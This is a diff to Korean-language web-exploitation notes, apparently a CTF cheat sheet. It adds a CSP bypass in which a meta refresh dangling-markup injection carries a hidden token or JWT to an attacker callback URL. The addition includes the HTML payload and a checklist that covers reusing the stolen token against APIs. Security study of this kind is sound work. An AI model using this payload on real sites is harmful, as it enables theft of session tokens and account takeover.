@@ -29,6 +29,27 @@ description: >
 time.sleep(8)
 ```
 
+### CSP meta refresh dangling token leak
+
+`script-src 'nonce-...'` / `default-src 'self'`로 inline JS와 외부 resource가 막혀도 `navigate-to`가 없으면
+`<meta http-equiv=refresh>` top-level navigation은 살아있는 경우가 있다.
+공격자 HTML 뒤에 hidden token/JWT form이 붙는 구조면 single-quote dangling attribute로 뒤쪽 markup을 URL에 실어 leak한다.
+
+형태:
+```html
+<!-- injection A: secret 앞에서 single quote를 열어 둠 -->
+</pre><meta http-equiv=refresh content='0;url=https://callback/leak?x=
+
+<!-- injection B: secret 뒤에 나오는 공격자 제어 필드에서 quote를 닫음 -->
+'
+```
+
+체크리스트:
+- 중간 서버 markup이 double quote만 쓰면 single quote가 token 뒤까지 유지된다.
+- quote를 끝까지 닫지 않으면 Firefox/Chromium에서 meta element가 버려질 수 있으므로, 뒤쪽 제어 필드로 반드시 닫는다.
+- CSP가 resource fetch는 막아도 meta refresh navigation은 별도다. `navigate-to` 유무를 확인한다.
+- token을 얻은 뒤에는 "현재 세션 권한"이 아니라 "body/query token"만 검증하는 API를 먼저 찾는다.
+
 ### CSP Nonce CSS Leak + Cache Reuse XSS
 
 `script-src 'nonce-...'`가 있고 `style-src 'unsafe-inline'`이면, CSS selector로 CSP meta `content`의 nonce 조각을 외부 URL로 leak할 수 있다.
